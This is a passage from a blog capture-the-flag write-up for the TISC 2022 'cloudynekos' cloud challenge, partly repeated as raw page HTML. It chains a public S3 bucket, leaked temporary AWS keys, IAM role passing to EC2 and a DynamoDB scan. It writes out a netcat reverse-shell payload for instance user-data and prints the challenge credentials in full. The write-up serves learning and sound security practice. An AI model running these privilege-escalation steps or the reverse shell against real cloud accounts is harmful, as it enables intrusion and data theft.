At this junction, our goal is to not just run any EC2 instance, but if you recall earlier on, the ec2_agent_role has permissions to interat with the dynamodb service. Lett’s take a look once again at what permissions the lambda_development_agent_role has:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateVolume\", \"ec2:CreateTags\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" }, { \"Action\": [ \"iam:PassRole\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::051751498533:role/ec2_agent_role\", \"Sid\": \"VisualEditor2\" } So, not only can it run EC2 instances but it also has the ability to pass on the ec2_agent_role on to the EC2 instance created, which is exactly what we need! In the context of EC2 instances, one can’t simply attach a “role” to an EC2 instance like this. If one wished to give a role to an EC2 instance, one would have to create an EC2 instance profile and attach said profile to the EC2 instance.\nIf we recall, our initial user credentials had the permissions to run the aws iam list-instance-profiles, and if we ran that command, we would indeed see an instance profile ec2_agent_instance_profile that has the ec2_agent_role attached to it already:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 └─$ aws iam list-instance-profiles { \"InstanceProfiles\": [ { \"Path\": \"/\", \"InstanceProfileName\": \"ec2_agent_instance_profile\", \"InstanceProfileId\": \"AIPAQYDFBGMS6EKSSQ2RF\", \"Arn\": \"arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile\", \"CreateDate\": \"2022-07-22T09:29:35Z\", \"Roles\": [ { \"Path\": \"/\", \"RoleName\": \"ec2_agent_role\", \"RoleId\": \"AROAQYDFBGMSYSEMEVAEH\", \"Arn\": \"arn:aws:iam::051751498533:role/ec2_agent_role\", \"CreateDate\": \"2022-07-22T09:29:34Z\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] } } ] } ] } Nice! But wait, there’s more. If we recall our initial enumeration, the notes.txt gave us a message: All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.\nSo this means that when we create our ec2 instance, we would have to create with a tag {Key=agent,Value={aws:username}}.\nIn addition, we would also need to specify which subnet and attach any relevant security groups to the EC2 instance, along with specifying an AMI. I guess this is where the initial permissions of being able to run aws ec2 describe-security-groups and aws ec2 describe-subnets come in handy since these are the 2 key pieces of information we want for this part of the challenge:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 └─$ aws ec2 describe-subnets 255 ⨯ { \"Subnets\": [ { \"AvailabilityZone\": \"ap-southeast-1a\", \"AvailabilityZoneId\": \"apse1-az2\", \"AvailableIpAddressCount\": 16379, \"CidrBlock\": \"10.0.0.0/18\", \"DefaultForAz\": false, \"MapPublicIpOnLaunch\": true, \"MapCustomerOwnedIpOnLaunch\": false, \"State\": \"available\", \"SubnetId\": \"subnet-0aa6ecdf900166741\", \"VpcId\": \"vpc-095cd9241e386169d\", \"OwnerId\": \"051751498533\", \"AssignIpv6AddressOnCreation\": false, \"Ipv6CidrBlockAssociationSet\": [], \"Tags\": [ { \"Key\": \"Name\", \"Value\": \"palindrome\" } ], \"SubnetArn\": \"arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741\", \"EnableDns64\": false, \"Ipv6Native\": false, \"PrivateDnsNameOptionsOnLaunch\": { \"HostnameType\": \"ip-name\", \"EnableResourceNameDnsARecord\": false, \"EnableResourceNameDnsAAAARecord\": false } } ] } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 └─$ aws ec2 describe-security-groups { \"SecurityGroups\": [ { \"Description\": \"Access to c2 infra\", \"GroupName\": \"default-agents-sg\", \"IpPermissions\": [ { \"FromPort\": 0, \"IpProtocol\": \"tcp\", \"IpRanges\": [ { \"CidrIp\": \"0.0.0.0/0\" } ], \"Ipv6Ranges\": [], \"PrefixListIds\": [], \"ToPort\": 65535, \"UserIdGroupPairs\": [] } ], \"OwnerId\": \"051751498533\", \"GroupId\": \"sg-047c958320ee832f0\", \"IpPermissionsEgress\": [ { \"IpProtocol\": \"-1\", \"IpRanges\": [ { \"CidrIp\": \"0.0.0.0/0\" } ], \"Ipv6Ranges\": [], \"PrefixListIds\": [], \"UserIdGroupPairs\": [] } ], \"VpcId\": \"vpc-095cd9241e386169d\" }, So to summarise, we want to attach the following pieces of information to our ec2 instance:\nsubnet-id: subnet-0aa6ecdf900166741 (retrieved through aws ec2 describe-subnets) security-group-ids: sg-047c958320ee832f0 (retrieved through aws ec2 describe-security-groups) tag-specifications: 'ResourceType=instance,Tags=[{Key=agent,Value=}]' (as specified in notes.txt) iam-instance-profile: \"Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile (retrieved through aws iam list-instance-profiles) instance-type: t2.micro (this can probably be anything honestly) image-id: ami-02ee763250491e04a (this can probably be anything as well but personally i chose to use an Ubuntu AMI). If you’re familiar with EC2 instances, you would realise that in order to access the EC2 instance, you’re going to need an SSH key, which unfortunately you do not have permissions to create. Fortunately, there’s another way to access the instance, and that is to catch a reverse shell, injecting the necessary reverse shell payload command on startup of the instance with the user-data argument. So in addition to all of the above, we would also want to create a text file that contains the command we want to run on startup and pass in to the user-data. Since I’m using an Ubuntu AMI, I decided to opt for the Netcat OpenBsd reverse shell command:\n1 2 3 4 └─$ cat file.txt #!/bin/bash rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 443 \u003e/tmp/f Let’s prepare to catch the reverse shell on our server: sudo nc -nlvp 443\nAnd now we run our ec2 instance!\n1 2 3 4 5 6 7 8 9 └─$ aws --profile lambda ec2 run-instances \\ 130 ⨯ --subnet-id subnet-0aa6ecdf900166741 \\ --image-id ami-02ee763250491e04a \\ --instance-type t2.micro \\ --security-group-ids sg-047c958320ee832f0 \\ --tag-specifications 'ResourceType=instance,Tags=[{Key=agent,Value=user-59b23d07b5ee4cb2a64d1e481dd4f235}]' \\ --user-data file://file.txt \\ --iam-instance-profile \"Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile\" \\ --region ap-southeast-1 After waiting for the instance to start up, we have caught our reverse shell!\nInteracting with the DynamoDB Service If we recall, our EC2 instance that has the ec2_agent_instance_profile attached has the ec2_agent_role permissions:\n1 2 3 4 5 6 7 8 9 10 11 12 \"Statement\": [ { \"Action\": [ \"dynamodb:DescribeTable\", \"dynamodb:ListTables\", \"dynamodb:Scan\", \"dynamodb:Query\" ], \"Effect\": \"Allow\", \"Resource\": \"*\", \"Sid\": \"VisualEditor0\" } Let’s first install the aws-cli onto the newly created EC2 instance:\nsudo apt update \u0026\u0026 sudo apt install awscli\nAfter installing the aws-cli, we can finally use it to interact with the DynamoDB service. Let’s enumerate the list of tables first with aws dynamodb list-tables:\n1 2 3 4 5 6 $ aws dynamodb list-tables --region ap-southeast-1 { \"TableNames\": [ \"flag_db\" ] } Oh nice, there’s a flag_db table! Let’s scan it and see what comes up!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ aws --region ap-southeast-1 dynamodb scan --table-name flag_db { \"Items\": [ { \"secret\": { \"S\": \"TISC{iT3_N0t_s0_C1oUdy}\" }, \"name\": { \"S\": \"flag\" } } ], \"Count\": 1, \"ScannedCount\": 1, \"ConsumedCapacity\": null } And there we have it! Our flag is in the flag_db table!\nLet’s summarise our whole journey on how we uncovered the flag:\nFinal Words If you made it this far, thank you for reading my write-up for this cloud challenge cloudynekos as part of TISC 2022! It was definitely a fun journey solving this cloud challenge and I definitely learned much more about how scary a set of leaked AWS IAM Credentials can quickly become, and also more importantly, how to abuse them as a pentester :)\n","wordCount":"3782","inLanguage":"en","datePublished":"2022-09-12T00:04:00+08:00","dateModified":"2022-09-12T00:04:00+08:00","author":{"@type":"Person","name":"Quentin Khoo"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://quentinkhoo.github.io/posts/tisc-2022-cloud-cloudynekos/"},"publisher":{"@type":"Organization","name":"Quentin","logo":{"@type":"ImageObject","url":"https://quentinkhoo.github.io/images/peepoclap.gif"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://quentinkhoo.github.io accesskey=h title="Home (Alt + H)"><img src=https://quentinkhoo.github.io/images/peepoclap.gif alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://quentinkhoo.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://quentinkhoo.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://quentinkhoo.github.io/about/ title=Whoami><span>Whoami</span></a></li><li><a href=https://quentinkhoo.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://quentinkhoo.github.io>Home</a>&nbsp;»&nbsp;<a href=https://quentinkhoo.github.io/posts/>Posts</a></div><h1 class=post-title>TISC 2022 Cloud Cloudynekos</h1><div class=post-meta><span title='2022-09-12 00:04:00 +0800 +0800'>September 12, 2022</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;3782 words&nbsp;·&nbsp;Quentin Khoo&nbsp;|&nbsp;<a href=https://github.com/quentinkhoo/quentinkhoo.github.io/content/posts/TISC-2022-cloud-cloudynekos.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#cloudynekos-challenge-description>CloudyNekos Challenge Description</a></li><li><a href=#introduction>Introduction</a></li><li><a href=#enumerating-aws-credentials-permissions>Enumerating AWS Credentials Permissions</a></li><li><a href=#abusing-lambda-functions>Abusing Lambda Functions</a><ul><li><a href=#creating-the-lambda-function>Creating the Lambda Function</a></li><li><a href=#invoking-the-lambda-function>Invoking the Lambda Function</a></li></ul></li><li><a href=#running-an-ec2-instance>Running an EC2 Instance</a></li><li><a href=#interacting-with-the-dynamodb-service>Interacting with the DynamoDB Service</a></li><li><a href=#final-words>Final Words</a></li></ul></nav></div></details></div><div class=post-content><h2 id=cloudynekos-challenge-description>CloudyNekos Challenge Description<a hidden class=anchor aria-hidden=true href=#cloudynekos-challenge-description>#</a></h2><p>This was a Cloud challenge unlocked at level 4 that was part of the recent <a href=https://www.csit.gov.sg/events/tisc/tisc-2022>TISC 2022</a> CTF organised by <a href=https://www.csit.gov.sg/>CSIT</a>. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge.</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>The challenge starts off by pointing us towards a domain:
<code>http://d20whnyjsgpc34.cloudfront.net</code>. Visiting the website shows you a couple of cute cat images <code>—ฅ/ᐠ. ̫ .ᐟ\ฅ —</code>
<img loading=lazy src=/images/posts/tisc-2022-level4-cloudfront-site.PNG alt=cat-image></p><p>After I finished being distracted by those cats, I noticed the following note in the website source code comments:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;p-5 text-center bg-light&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- Passcode --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;mb-3&#34;</span><span class=p>&gt;</span>Cats rule the world<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- Passcode --&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- 
</span></span></span><span class=line><span class=cl><span class=c>    ----- Completed -----
</span></span></span><span class=line><span class=cl><span class=c>    * Configure CloudFront to use the bucket - palindromecloudynekos as the origin
</span></span></span><span class=line><span class=cl><span class=c>    
</span></span></span><span class=line><span class=cl><span class=c>    ----- TODO -----
</span></span></span><span class=line><span class=cl><span class=c>    * Configure custom header referrer and enforce S3 bucket to only accept that particular header
</span></span></span><span class=line><span class=cl><span class=c>    * Secure all object access
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h4</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;mb-3&#34;</span><span class=p>&gt;</span>—ฅ/ᐠ. ̫ .ᐟ\ฅ —<span class=p>&lt;/</span><span class=nt>h4</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>So at this there were 2 things I took note of:</p><ul><li>There is a passcode?</li><li>There is a bucket <code>palindromecloudynekos</code></li></ul><p>A bucket in Cloud context probably meant an S3 bucket and so I took the liberty to enumerate this particular s3 bucket <code>palindromecloudynekos</code> and see if it were publicly accessible and voila, the bucket was indeed publicly accessible and I could indeed run <code>aws s3 ls</code> on it!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws s3 ls s3://palindromecloudynekos/
</span></span><span class=line><span class=cl>                           PRE api/
</span></span><span class=line><span class=cl>                           PRE img/
</span></span><span class=line><span class=cl>2022-08-23 09:16:20         <span class=m>34</span> error.html
</span></span><span class=line><span class=cl>2022-08-23 09:16:20       <span class=m>2257</span> index.html
</span></span></code></pre></td></tr></table></div></div><p>The <code>api</code> folder looked interesting and running <code>aws s3 ls s3://palindromecloudynekos/api/</code> revealed the existence of a file <code>notes.txt</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws s3 ls s3://palindromecloudynekos/api/
</span></span><span class=line><span class=cl>2022-08-23 09:16:20        <span class=m>432</span> notes.txt
</span></span></code></pre></td></tr></table></div></div><p>So lets go ahead and copy the file out and to look at its contents with <code>aws s3 cp s3://palindromecloudynekos/api/notes.txt .</code> and then we would be led to the next hint, an API gateway endpoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ cat notes.txt 
</span></span><span class=line><span class=cl># Neko Access System Invocation Notes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Invoke with the passcode in the header &#34;x-cat-header&#34;. The passcode is found on the cloudfront site, all lower caps and separated using underscore.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>All EC2 computing instances should be tagged with the key: &#39;agent&#39; and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
</span></span></code></pre></td></tr></table></div></div><p>Remember our first clue regarding a passcode? Ahhhh yes, I guess this is where it comes in handy. From the clues it seems like we have to interact with the API gateway with a custom header <code>x-cat-header: cats_rule_the_world</code>. Lets make this request into a script and run it to see what we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># solve.py</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>api_url</span> <span class=o>=</span> <span class=s2>&#34;https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent&#34;</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;x-cat-header&#34;</span><span class=p>:</span> <span class=s2>&#34;cats_rule_the_world&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>api_url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ python3 solve.py
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;Message&#34;</span>: <span class=s2>&#34;Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.&#34;</span>, <span class=s2>&#34;Access_Key&#34;</span>: <span class=s2>&#34;AKIAQYDFBGMS6NCB2UGD&#34;</span>, <span class=s2>&#34;Secret_Key&#34;</span>: <span class=s2>&#34;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&#34;</span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Turns out interacting with the API gateway with the custom header returns us a set of AWS credentials. So let&rsquo;s go ahead and see what our provided AWS credentials is capable of</p><h2 id=enumerating-aws-credentials-permissions>Enumerating AWS Credentials Permissions<a hidden class=anchor aria-hidden=true href=#enumerating-aws-credentials-permissions>#</a></h2><p>When given a set of AWS credentials like this, one of the first things you would like to do is to see what kind of permissions it has access to. In this case I used <a href=https://github.com/andresriancho/enumerate-iam>enumerate-iam</a> to do my first round of enumeration to see what kind of permissions these set of credentials have access to.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ python3 enumerate-iam.py --access-key AKIAQYDFBGMS6NCB2UGD --secret-key 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
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Starting permission enumeration <span class=k>for</span> access-key-id <span class=s2>&#34;AKIAQYDFBGMS6NCB2UGD&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- Account ARN : arn:aws:iam::051751498533:user/user-66648ab7e833453d8881002651a45a47
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- Account Id  : <span class=m>051751498533</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- Account Path: user/user-66648ab7e833453d8881002651a45a47
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Attempting common-service describe / list brute force.
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- dynamodb.describe_endpoints<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- iam.list_roles<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- iam.list_instance_profiles<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- ec2.describe_route_tables<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- ec2.describe_security_groups<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- ec2.describe_regions<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- ec2.describe_subnets<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- ec2.describe_vpcs<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- sts.get_session_token<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- sts.get_caller_identity<span class=o>()</span> worked!
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> -- ec2.describe_instance_types<span class=o>()</span> worked!
</span></span></code></pre></td></tr></table></div></div><p>From the above, we can see a few interesting permissions related to the provided AWS credentials, namely:</p><ul><li><code>ec2.describe_route_tables</code>: relating to network routing information for gateways and subnets</li><li><code>ec2.describe_security_groups</code>: relating to EC2 security groups created</li><li><code>ec2.describe_subnets</code>: relating to subnets</li><li><code>ec2.describe_vpcs</code>: relating to EC2 VPCs</li><li><code>iam.list_roles</code>: relating to IAM roles that are available</li><li><code>iam_list_instance_profiles</code>: relating to IAM instance profiles.</li></ul><p>There were quite a lot of things to go through but lets focus on what&rsquo;s interesting for now:</p><p><code>aws iam list-roles</code>: Using this command I got a list of roles that were available, in which 2 of them turned out to be relevant to the challenge:</p><p><code>ec2_agent_role</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Path&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;RoleName&#34;</span><span class=p>:</span> <span class=s2>&#34;ec2_agent_role&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;RoleId&#34;</span><span class=p>:</span> <span class=s2>&#34;AROAQYDFBGMSYSEMEVAEH&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Arn&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:iam::051751498533:role/ec2_agent_role&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;CreateDate&#34;</span><span class=p>:</span> <span class=s2>&#34;2022-07-22T09:29:34Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;AssumeRolePolicyDocument&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Version&#34;</span><span class=p>:</span> <span class=s2>&#34;2012-10-17&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Statement&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=nt>&#34;Principal&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&#34;Service&#34;</span><span class=p>:</span> <span class=s2>&#34;ec2.amazonaws.com&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>},</span>
</span></span><span class=line><span class=cl>                <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=s2>&#34;sts:AssumeRole&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;MaxSessionDuration&#34;</span><span class=p>:</span> <span class=mi>3600</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=err>,</span>
</span></span></code></pre></td></tr></table></div></div><p><code>lambda_agent_development_role</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Path&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;RoleName&#34;</span><span class=p>:</span> <span class=s2>&#34;lambda_agent_development_role&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;RoleId&#34;</span><span class=p>:</span> <span class=s2>&#34;AROAQYDFBGMS2NDQR5JSE&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Arn&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:iam::051751498533:role/lambda_agent_development_role&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;CreateDate&#34;</span><span class=p>:</span> <span class=s2>&#34;2022-07-22T09:29:34Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;AssumeRolePolicyDocument&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Version&#34;</span><span class=p>:</span> <span class=s2>&#34;2012-10-17&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Statement&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=nt>&#34;Principal&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&#34;Service&#34;</span><span class=p>:</span> <span class=s2>&#34;lambda.amazonaws.com&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>},</span>
